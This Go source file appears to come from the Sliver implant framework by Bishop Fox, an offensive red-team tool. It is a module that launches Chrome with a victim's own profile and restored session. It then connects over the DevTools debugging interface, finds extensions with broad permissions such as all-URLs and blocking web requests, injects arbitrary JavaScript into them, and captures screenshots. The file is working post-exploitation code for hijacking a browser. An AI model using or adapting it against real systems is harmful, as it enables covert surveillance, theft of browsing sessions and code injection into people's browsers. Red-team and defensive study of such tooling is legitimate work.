package overlord

/*
	Sliver Implant Framework
	Copyright (C) 2020  Bishop Fox
	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.
	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.
	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"runtime"

	"github.com/chromedp/cdproto/page"
	"github.com/chromedp/cdproto/target"
	"github.com/chromedp/chromedp"
)

const (
	darwinUserDataDir  = "Library/Application Support/Google/Chrome"
	linuxUserDataDir   = ".config/google-chrome"
	windowsUserDataDir = `Google\Chrome\User Data`
)

var (
	// ErrTargetNotFound - Returned when a target cannot be found
	ErrTargetNotFound = errors.New("Target not found")
)

// ManifestBackground - An extension manifest file
type ManifestBackground struct {
	Scripts    []string `json:"scripts"`
	Persistent bool     `json:"persistent"`
}

// Manifest - An extension manifest file
type Manifest struct {
	Name            string             `json:"name"`
	Version         string             `json:"version"`
	Description     string             `json:"description"`
	ManifestVersion int                `json:"manifest_version"`
	Permissions     []string           `json:"permissions"`
	Background      ManifestBackground `json:"background"`
}

// ChromeDebugTarget - A single debug context object
type ChromeDebugTarget struct {
	Description          string `json:"description"`
	DevToolsFrontendURL  string `json:"devtoolsFrontendUrl"`
	ID                   string `json:"id"`
	Title                string `json:"title"`
	Type                 string `json:"type"`
	URL                  string `json:"url"`
	WebSocketDebuggerURL string `json:"webSocketDebuggerUrl"`
}

const (
	// AllURLs - All URLs permission
	AllURLs = "<all_urls>"

	// AllHTTP - All HTTP permission
	AllHTTP = "http://*/*"

	// AllHTTPS - All HTTP permission
	AllHTTPS = "https://*/*"

	// WebRequest - WebRequest permission
	WebRequest = "webRequest"

	// WebRequestBlocking - WebRequestBlocking permission
	WebRequestBlocking = "webRequestBlocking"

	// FetchManifestJS - Get extension manifest
	FetchManifestJS = "(() => { return chrome.runtime.getManifest(); })()"
)

var allocCtx context.Context

func getContextOptions(userHomeDir string) []func(*chromedp.ExecAllocator) {
	opts := []func(*chromedp.ExecAllocator){
		chromedp.Flag("restore-last-session", true),
		chromedp.UserDataDir(userHomeDir),
	}
	if runtime.GOOS == "darwin" {
		opts = append(opts,
			chromedp.Flag("headless", false),
			chromedp.Flag("use-mock-keychain", false),
		)
	} else {
		opts = append(opts, chromedp.Headless)
	}
	opts = append(chromedp.DefaultExecAllocatorOptions[:], opts...)
	return opts
}

func getChromeContext(userHomeDir string, webSocketURL string) (context.Context, context.CancelFunc, context.CancelFunc) {
	var (
		cancel context.CancelFunc
	)
	if webSocketURL != "" {
		allocCtx, cancel = chromedp.NewRemoteAllocator(context.Background(), webSocketURL)
	} else {
		opts := getContextOptions(userHomeDir)
		allocCtx, cancel = chromedp.NewExecAllocator(context.Background(), opts...)
	}
	taskCtx, taskCancel := chromedp.NewContext(allocCtx, chromedp.WithLogf(log.Printf))
	return taskCtx, taskCancel, cancel
}

func findTargetInfoByID(taskCtx context.Context, targetID string) *target.Info {
	targets, err := chromedp.Targets(taskCtx)
	if err != nil {
		return nil
	}
	for _, targetInfo := range targets {
		if fmt.Sprintf("%s", targetInfo.TargetID) == targetID {
			return targetInfo
		}
	}
	return nil
}

func contains(haystack []string, needle string) bool {
	set := make(map[string]struct{}, len(haystack))
	for _, entry := range haystack {
		set[entry] = struct{}{}
	}
	_, ok := set[needle]
	return ok
}

func containsAll(haystack []string, needles []string) bool {
	all := true
	for _, needle := range needles {
		if !contains(haystack, needle) {
			all = false
			break
		}
	}
	return all
}

// ExecuteJS - injects a JavaScript code into a target
func ExecuteJS(userHomeDir string, webSocketURL string, targetID string, jsCode string) ([]byte, error) {
	taskCtx, _, _ := getChromeContext(userHomeDir, webSocketURL)
	targetInfo := findTargetInfoByID(taskCtx, targetID)
	if targetInfo == nil {
		return []byte{}, ErrTargetNotFound
	}
	extensionContext, _ := chromedp.NewContext(taskCtx, chromedp.WithTargetID(targetInfo.TargetID))
	var result []byte
	err := chromedp.Run(extensionContext, chromedp.Evaluate(jsCode, &result))
	return result, err
}

// Screenshot - Take a screenshot of a Chrome context
func Screenshot(userHomeDir string, webSocketURL string, targetID string, quality int64) ([]byte, error) {

	var result []byte
	screenshotTask := chromedp.Tasks{
		chromedp.ActionFunc(func(ctx context.Context) error {
			_, _, _, _, _, contentSize, err := page.GetLayoutMetrics().Do(ctx)
			if err != nil {
				return err
			}
			result, err = page.CaptureScreenshot().
				WithQuality(quality).
				WithClip(&page.Viewport{
					X:      contentSize.X,
					Y:      contentSize.Y,
					Width:  contentSize.Width,
					Height: contentSize.Height,
					Scale:  1,
				}).Do(ctx)
			if err != nil {
				return err
			}
			return nil
		}),
	}

	taskCtx, taskCancel, cancel := getChromeContext(userHomeDir, webSocketURL)
	defer taskCancel()
	defer cancel()
	targetInfo := findTargetInfoByID(taskCtx, targetID)
	if targetInfo == nil {
		return []byte{}, ErrTargetNotFound
	}
	ctx, _ := chromedp.NewContext(taskCtx, chromedp.WithTargetID(targetInfo.TargetID))
	if err := chromedp.Run(ctx, screenshotTask); err != nil {
		return nil, err
	}
	return result, nil
}

// FindExtensionWithPermissions - Find an extension with a permission
func FindExtensionWithPermissions(userHomeDir string, debugURL string, permissions []string) (*ChromeDebugTarget, error) {
	targets, err := QueryExtensionDebugTargets(debugURL)
	if err != nil {
		return nil, err
	}
	for _, target := range targets {
		result, err := ExecuteJS(userHomeDir, target.WebSocketDebuggerURL, target.ID, FetchManifestJS)
		if err != nil {
			continue
		}
		manifest := &Manifest{}
		err = json.Unmarshal(result, manifest)
		if err != nil {
			continue
		}
		if containsAll(manifest.Permissions, permissions) {
			return &target, nil
		}
	}
	return nil, nil // No targets, no errors
}

// FindExtensionsWithPermissions - Find an extension with a permission
func FindExtensionsWithPermissions(userHomeDir string, debugURL string, permissions []string) ([]*ChromeDebugTarget, error) {
	targets, err := QueryExtensionDebugTargets(debugURL)
	if err != nil {
		return nil, err
	}
	extensions := []*ChromeDebugTarget{}
	for _, target := range targets {
		result, err := ExecuteJS(userHomeDir, target.WebSocketDebuggerURL, target.ID, FetchManifestJS)
		if err != nil {
			continue
		}
		manifest := &Manifest{}
		err = json.Unmarshal(result, manifest)
		if err != nil {
			continue
		}
		if containsAll(manifest.Permissions, permissions) {
			extensions = append(extensions, &target)
		}
	}
	return extensions, nil
}

// QueryDebugTargets - Query debug listener using HTTP client
func QueryDebugTargets(debugURL string) ([]ChromeDebugTarget, error) {
	resp, err := http.Get(debugURL)
	if err != nil {
		return nil, err
	}
	if resp.StatusCode != 200 {
		return nil, errors.New("Non-200 status code")
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	debugContexts := []ChromeDebugTarget{}
	err = json.Unmarshal(data, &debugContexts)
	return debugContexts, err
}

// QueryExtensionDebugTargets - Query debug listener using HTTP client for Extensions only
func QueryExtensionDebugTargets(debugURL string) ([]ChromeDebugTarget, error) {
	resp, err := http.Get(debugURL)
	if err != nil {
		return nil, err
	}
	if resp.StatusCode != 200 {
		return nil, errors.New("Non-200 status code")
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	debugContexts := []ChromeDebugTarget{}
	err = json.Unmarshal(data, &debugContexts)
	if err != nil {
		return nil, err
	}
	extensionContexts := []ChromeDebugTarget{}
	for _, debugCtx := range debugContexts {
		ctxURL, err := url.Parse(debugCtx.URL)
		if err != nil {
			continue
		}
		if ctxURL.Scheme == "chrome-extension" {
			extensionContexts = append(extensionContexts, debugCtx)
		}
	}
	return extensionContexts, nil
}
